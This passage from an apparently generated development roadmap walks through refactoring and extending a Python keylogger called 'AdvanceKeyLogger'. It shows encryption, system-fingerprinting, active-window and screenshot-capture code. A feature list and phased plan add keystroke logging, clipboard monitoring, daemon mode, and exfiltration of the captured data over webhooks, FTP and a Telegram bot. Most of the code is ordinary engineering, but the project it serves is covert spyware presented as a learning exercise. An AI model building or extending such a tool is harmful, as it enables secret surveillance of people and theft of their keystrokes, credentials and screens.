        iterations=480_000,  # OWASP 2023 recommendation
    )
    key = kdf.derive(password.encode('utf-8'))
    return key, salt


def encrypt(data: bytes, key: bytes) -> bytes:
    """
    Encrypt data using AES-256-CBC.

    Output format: [16-byte IV][encrypted data]

    The IV (Initialization Vector) ensures that encrypting the same
    data twice produces different ciphertext.
    """
    # Generate random IV
    iv = os.urandom(16)

    # Pad data to AES block size (16 bytes)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Encrypt
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    logger.debug("Encrypted %d bytes -> %d bytes", len(data), len(iv + ciphertext))
    return iv + ciphertext  # Prepend IV for decryption


def decrypt(data: bytes, key: bytes) -> bytes:
    """
    Decrypt data encrypted with encrypt().

    Reads the IV from the first 16 bytes, then decrypts the rest.
    """
    iv = data[:16]
    ciphertext = data[16:]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()

    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()

    return plaintext
```

### Key Learning Concepts

- **AES-256-CBC** — widely used symmetric encryption
- **Initialization Vector (IV)** — random prefix ensures uniqueness
- **PKCS7 padding** — AES requires data in 16-byte blocks
- **PBKDF2** — turns passwords into keys (slow on purpose to resist brute-force)
- **`os.urandom()`** — cryptographically secure random bytes
- **Format: [IV][ciphertext]** — common pattern for storing encrypted data

---

## 12. System Metadata Collection

```python
"""
utils/system_info.py — Collect system metadata for context.

Demonstrates cross-platform system information gathering.
"""
import os
import platform
import socket
import getpass
import logging
from datetime import datetime

logger = logging.getLogger(__name__)


def get_system_info() -> dict:
    """
    Collect system metadata.

    Returns dict with hostname, username, OS, IP, etc.
    """
    info = {
        "hostname": _safe_call(socket.gethostname),
        "username": _safe_call(getpass.getuser),
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "architecture": platform.machine(),
        "python_version": platform.python_version(),
        "local_ip": _get_local_ip(),
        "timestamp": datetime.now().isoformat(),
        "pid": os.getpid(),
    }
    logger.debug("System info collected: %s", info)
    return info


def _get_local_ip() -> str:
    """Get the machine's local IP address."""
    try:
        # This doesn't actually send data — it just opens a UDP socket
        # to determine which network interface would be used
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def _safe_call(func, default="unknown"):
    """Call a function, returning default on any error."""
    try:
        return func()
    except Exception:
        return default
```

---

## 13. Process Management

```python
"""
utils/process.py — PID lock file and signal handling.

Prevents multiple instances and ensures clean shutdown.
"""
import os
import sys
import signal
import atexit
import logging
from pathlib import Path

logger = logging.getLogger(__name__)


class PIDLock:
    """
    Prevents multiple instances from running simultaneously.

    Creates a lock file containing the PID. On startup, checks if
    another instance is already running.
    """

    def __init__(self, pid_file: str = "/tmp/advancekeylogger.pid"):
        self.pid_file = Path(pid_file)

    def acquire(self) -> bool:
        """
        Attempt to acquire the PID lock.

        Returns True if lock acquired, False if another instance is running.
        """
        if self.pid_file.exists():
            existing_pid = int(self.pid_file.read_text().strip())
            if self._is_process_running(existing_pid):
                logger.error("Another instance is running (PID %d)", existing_pid)
                return False
            else:
                logger.warning("Stale PID file found, removing")
                self.pid_file.unlink()

        self.pid_file.write_text(str(os.getpid()))
        atexit.register(self.release)  # Clean up on exit
        logger.info("PID lock acquired: %s", self.pid_file)
        return True

    def release(self):
        """Release the PID lock."""
        try:
            if self.pid_file.exists():
                self.pid_file.unlink()
                logger.info("PID lock released")
        except OSError as e:
            logger.error("Failed to release PID lock: %s", e)

    @staticmethod
    def _is_process_running(pid: int) -> bool:
        """Check if a process with the given PID is running."""
        try:
            os.kill(pid, 0)  # Signal 0 = just check if process exists
            return True
        except ProcessLookupError:
            return False
        except PermissionError:
            return True  # Process exists but we can't signal it


class GracefulShutdown:
    """
    Handle SIGINT/SIGTERM for clean shutdown.

    Usage:
        shutdown = GracefulShutdown()
        while not shutdown.requested:
            do_work()
        # Clean up here
    """

    def __init__(self):
        self.requested = False
        signal.signal(signal.SIGINT, self._handler)
        signal.signal(signal.SIGTERM, self._handler)

    def _handler(self, signum, frame):
        sig_name = signal.Signals(signum).name
        logger.info("Received %s, initiating graceful shutdown...", sig_name)
        self.requested = True
```

### Key Learning Concepts

- **PID files** — standard Unix pattern for single-instance enforcement
- **`atexit`** — register cleanup functions that run on normal exit
- **Signal handling** — gracefully respond to Ctrl+C (SIGINT) and kill (SIGTERM)
- **`os.kill(pid, 0)`** — check if a process exists without actually signaling it

---

## 14. Retry Logic & Resilience

See Section 5 (Error Handling) for the `@retry` decorator pattern.

Additional resilience patterns:

```python
"""
Additional resilience patterns for transport modules.
"""
import time
import logging
from collections import deque

logger = logging.getLogger(__name__)


class TransportQueue:
    """
    Queue data for transport with retry on failure.

    If transport fails, data stays in the queue for the next cycle.
    Prevents data loss on transient network failures.
    """

    def __init__(self, max_size: int = 1000):
        self._queue = deque(maxlen=max_size)

    def enqueue(self, item: dict):
        """Add item to transport queue."""
        self._queue.append(item)

    def drain(self, batch_size: int = 50) -> list[dict]:
        """Remove and return up to batch_size items."""
        batch = []
        for _ in range(min(batch_size, len(self._queue))):
            batch.append(self._queue.popleft())
        return batch

    def requeue(self, items: list[dict]):
        """Put items back at the front of the queue (failed transport)."""
        self._queue.extendleft(reversed(items))
        logger.warning("Re-queued %d items for retry", len(items))

    @property
    def size(self) -> int:
        return len(self._queue)


class CircuitBreaker:
    """
    Prevent hammering a broken service.

    After N consecutive failures, "open" the circuit (stop trying)
    for a cooldown period. Then allow one test request through.
    If it succeeds, close the circuit (resume normal operation).

    States:
        CLOSED  -> normal operation, requests go through
        OPEN    -> failures exceeded threshold, requests blocked
        HALF_OPEN -> cooldown expired, allow one test request
    """

    def __init__(self, failure_threshold: int = 5, cooldown: float = 60.0):
        self.failure_threshold = failure_threshold
        self.cooldown = cooldown
        self._failures = 0
        self._last_failure_time = 0.0
        self._state = "CLOSED"

    def can_proceed(self) -> bool:
        if self._state == "CLOSED":
            return True
        if self._state == "OPEN":
            if time.time() - self._last_failure_time > self.cooldown:
                self._state = "HALF_OPEN"
                logger.info("Circuit half-open, allowing test request")
                return True
            return False
        # HALF_OPEN
        return True

    def record_success(self):
        self._failures = 0
        if self._state == "HALF_OPEN":
            self._state = "CLOSED"
            logger.info("Circuit closed (service recovered)")

    def record_failure(self):
        self._failures += 1
        self._last_failure_time = time.time()
        if self._failures >= self.failure_threshold:
            self._state = "OPEN"
            logger.warning(
                "Circuit opened after %d failures (cooldown: %.0fs)",
                self._failures, self.cooldown,
            )
```

### Key Learning Concepts

- **Queue with retry** — don't lose data on transient failures
- **Circuit breaker pattern** — stop hammering a broken service
- **`deque(maxlen=N)`** — bounded queue that auto-discards oldest items
- **State machine** — CLOSED → OPEN → HALF_OPEN → CLOSED

---

## 15. Cross-Platform Compatibility

### Key Areas to Handle

```python
"""
Patterns for cross-platform Python code.
"""
import platform
import sys


def get_platform() -> str:
    """Returns 'windows', 'linux', or 'darwin' (macOS)."""
    return platform.system().lower()


# PATTERN 1: Platform-specific imports
system = get_platform()
if system == "windows":
    import ctypes  # For window title on Windows
elif system == "darwin":
    # macOS requires accessibility permissions for input monitoring
    pass
elif system == "linux":
    pass


# PATTERN 2: Platform-specific paths
from pathlib import Path

def get_data_dir() -> Path:
    """Get the appropriate data directory for the platform."""
    system = get_platform()
    if system == "windows":
        base = Path(os.environ.get("APPDATA", "~"))
    elif system == "darwin":
        base = Path.home() / "Library" / "Application Support"
    else:
        base = Path(os.environ.get("XDG_DATA_HOME", Path.home() / ".local" / "share"))
    return base / "AdvanceKeyLogger"


# PATTERN 3: Active window detection (platform-specific)
def get_active_window_title() -> str:
    """Get the title of the currently focused window."""
    system = get_platform()
    try:
        if system == "linux":
            import subprocess
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=2,
            )
            return result.stdout.strip()

        elif system == "windows":
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value

        elif system == "darwin":
            import subprocess
            script = '''
            tell application "System Events"
                set frontApp to name of first application process whose frontmost is true
            end tell
            '''
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2,
            )
            return result.stdout.strip()

    except Exception as e:
        return f"Unknown ({e})"
    return "Unknown"
```

### Key Learning Concepts

- **`platform.system()`** — detect OS at runtime
- **Conditional imports** — only import platform-specific modules where available
- **XDG Base Directory Specification** — standard Linux paths for user data
- **`ctypes`** — call C libraries from Python (Windows API)
- **`subprocess`** — run external commands (xdotool, osascript)

---

## 16. Type Hints

### Before (No Types)

```python
def takeScreenshoot(path):
    global imageNumber
    image = pyscreenshot.grab()
    file_path = path + "Screenshoot_" + str(imageNumber) + ".png"
    image.save(file_path)
    imageNumber += 1
```

### After (Fully Typed)

```python
from pathlib import Path
from PIL import Image


def take_screenshot(save_dir: Path, count: int) -> tuple[Path | None, int]:
    """
    Capture a screenshot and save it.

    Args:
        save_dir: Directory to save the screenshot in
        count: Current screenshot number (for filename)

    Returns:
        Tuple of (filepath or None if failed, updated count)
    """
    try:
        image: Image.Image = ImageGrab.grab()
        filepath = save_dir / f"screenshot_{count:04d}.png"
        image.save(str(filepath))
        return filepath, count + 1
    except OSError:
        return None, count
```

### Type Hint Cheat Sheet

```python
# Basic types
name: str = "hello"
count: int = 0
ratio: float = 0.5
flag: bool = True

# Optional (can be None)
result: str | None = None          # Python 3.10+
result: Optional[str] = None       # Python 3.9 and earlier

# Collections
names: list[str] = ["a", "b"]
config: dict[str, int] = {"port": 8080}
coords: tuple[int, int] = (10, 20)
unique: set[str] = {"a", "b"}

# Function signatures
def process(data: bytes, compress: bool = True) -> dict[str, any]:
    ...

# Class attributes
class Capture:
    name: str
    _count: int
    _running: bool = False
```

### Key Learning Concepts

- **Type hints don't affect runtime** — they're for documentation and tooling
- **`mypy`** — static type checker that catches bugs before running code
- **Return types** — make function contracts explicit
- **`|` union syntax** — Python 3.10+ for "this or that" types

---

## 17. Unit Testing

### Setup

```bash
pip install pytest pytest-cov
```

### Example Test File

```python
"""
tests/test_storage.py — Unit tests for the storage layer.

Demonstrates:
- pytest fixtures for setup/teardown
- Temporary directories
- Mocking
- Parameterized tests
"""
import pytest
from pathlib import Path
from storage.manager import StorageManager


@pytest.fixture
def temp_storage(tmp_path):
    """Create a StorageManager with a temporary directory."""
    return StorageManager(data_dir=str(tmp_path), max_size_mb=1)


class TestStorageManager:
    """Tests for StorageManager."""

    def test_store_file(self, temp_storage):
        """Test basic file storage."""
        data = b"Hello, World!"
        result = temp_storage.store(data, "test.txt")
        assert result is not None
        assert result.exists()
        assert result.read_bytes() == data

    def test_storage_limit(self, temp_storage):
        """Test that storage respects size limits."""
        # Fill storage (1 MB limit)
        large_data = b"x" * (1024 * 1024)  # 1 MB
        temp_storage.store(large_data, "big.bin")

        # Next store should trigger rotation or fail
        result = temp_storage.store(b"small", "small.txt")
        # With rotation enabled, old file should be deleted
        assert result is not None

    def test_empty_storage_size(self, temp_storage):
        """Test that empty storage reports 0 size."""
        assert temp_storage.get_total_size() == 0
        assert temp_storage.get_usage_percent() == 0.0

    def test_cleanup(self, temp_storage):
        """Test cleanup of specific files."""
        path1 = temp_storage.store(b"file1", "f1.txt")
        path2 = temp_storage.store(b"file2", "f2.txt")

        deleted = temp_storage.cleanup([str(path1)])
        assert deleted == 1
        assert not path1.exists()
        assert path2.exists()

    @pytest.mark.parametrize("size_mb,expected", [
        (0.5, True),   # Under limit
        (1.5, False),  # Over limit (without rotation)
    ])
    def test_has_space(self, tmp_path, size_mb, expected):
        """Test space checking with various sizes."""
        storage = StorageManager(
            data_dir=str(tmp_path), max_size_mb=1, rotation=False
        )
        needed = int(size_mb * 1024 * 1024)
        assert storage.has_space(needed) == expected


# --- Testing with mocks ---
from unittest.mock import patch, MagicMock


class TestScreenshotCapture:
    """Example of testing with mocks."""

    @patch("capture.screenshot_capture.ImageGrab")
    def test_take_screenshot(self, mock_grab, tmp_path):
        """Test screenshot capture with mocked screen grab."""
        # Arrange
        mock_image = MagicMock()
        mock_grab.grab.return_value = mock_image

        config = {
            "data_dir": str(tmp_path),
            "format": "png",
            "quality": 80,
            "max_count": 10,
        }

        from capture.screenshot_capture import ScreenshotCapture
        cap = ScreenshotCapture(config)
        cap.start()

        # Act
        result = cap.take_screenshot()

        # Assert
        mock_grab.grab.assert_called_once()
        mock_image.save.assert_called_once()
        assert result is not None
```

### Running Tests

```bash
# Run all tests
pytest tests/ -v

# Run with coverage report
pytest tests/ --cov=. --cov-report=term-missing

# Run a specific test
pytest tests/test_storage.py::TestStorageManager::test_store_file -v
```

### Key Learning Concepts

- **`pytest` fixtures** — reusable setup/teardown (`tmp_path` is built-in)
- **`@pytest.mark.parametrize`** — run the same test with different inputs
- **`unittest.mock`** — replace real objects with fakes for isolation
- **`--cov`** — measure which lines your tests execute
- **Test naming** — `test_<what>` makes output readable

---

## 18. CI/CD Pipeline

### GitHub Actions Workflow

Create `.github/workflows/ci.yml`:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.10", "3.11", "3.12"]

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install ruff pytest pytest-cov

      - name: Lint with ruff
        run: ruff check .

      - name: Format check with ruff
        run: ruff format --check .

      - name: Type check with mypy
        run: |
          pip install mypy
          mypy . --ignore-missing-imports

      - name: Run tests
        run: pytest tests/ -v --cov=. --cov-report=xml

      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          file: ./coverage.xml
```

### Key Learning Concepts

- **Matrix strategy** — test across multiple Python versions
- **Linting in CI** — catch issues before merge
- **Coverage reporting** — track test coverage over time
- **Automated on push/PR** — every change is validated

---

## 19. Linting & Code Quality

### `pyproject.toml` Configuration

```toml
[project]
name = "AdvanceKeyLogger"
version = "0.1.0"
requires-python = ">=3.10"

[tool.ruff]
line-length = 100
target-version = "py310"

[tool.ruff.lint]
select = [
    "E",     # pycodestyle errors
    "W",     # pycodestyle warnings
    "F",     # pyflakes
    "I",     # isort (import sorting)
    "B",     # flake8-bugbear
    "UP",    # pyupgrade (modern Python syntax)
    "SIM",   # flake8-simplify
]

[tool.ruff.format]
quote-style = "double"

[tool.pytest.ini_options]
testpaths = ["tests"]
addopts = "-v --tb=short"

[tool.mypy]
python_version = "3.10"
warn_return_any = true
warn_unused_configs = true
```

### Quick Commands

```bash
# Install linter
pip install ruff

# Check for issues
ruff check .

# Auto-fix issues
ruff check --fix .

# Format code
ruff format .
```

---

## 20. Feature Ideas Summary

| # | Feature | Module | Complexity |
|---|---------|--------|------------|
| 1 | Actual keystroke logging | `capture/keyboard_capture.py` | Medium |
| 2 | Clipboard monitoring | `capture/clipboard_capture.py` | Low |
| 3 | Active window tracking | `capture/window_capture.py` | Medium |
| 4 | HTTP webhook transport | `transport/http_transport.py` | Low |
| 5 | FTP/SFTP transport | `transport/ftp_transport.py` | Medium |
| 6 | Telegram bot transport | `transport/telegram_transport.py` | Low |
| 7 | SQLite structured storage | `storage/sqlite_storage.py` | Medium |
| 8 | AES encryption | `utils/crypto.py` | Medium |
| 9 | ZIP compression | `utils/compression.py` | Low |
| 10 | System metadata collection | `utils/system_info.py` | Low |
| 11 | PID lock (single instance) | `utils/process.py` | Low |
| 12 | Graceful shutdown (signals) | `utils/process.py` | Low |
| 13 | Background/daemon mode | `main.py` | Medium |
| 14 | Cross-platform support | All modules | High |
| 15 | Config-driven plugin loading | `capture/__init__.py` | Medium |

---

## 21. Priority Roadmap

### Phase 1: Foundation (Do First)

1. Fix all 10 bugs listed in Section 2
2. Create the project structure (Section 3)
3. Add `.gitignore`, `requirements.txt`, `pyproject.toml`
4. Implement the config system (Section 4)
5. Set up logging (Section 6)
6. Create the base classes (Section 7)

### Phase 2: Core Rewrite

7. Rewrite screenshot capture as a class
8. Rewrite email transport as a class
9. Implement storage manager with limits
10. Add proper error handling everywhere
11. Create `main.py` entry point with argparse

### Phase 3: New Features

12. Add keyboard capture module
13. Add clipboard monitoring
14. Add active window tracking
15. Add compression and encryption
16. Add additional transport methods

### Phase 4: Quality

17. Add type hints throughout
18. Write unit tests for every module
19. Set up CI/CD pipeline
20. Add linting configuration
21. Write README documentation

---

*Generated by codebase review. Use this as your implementation roadmap.*
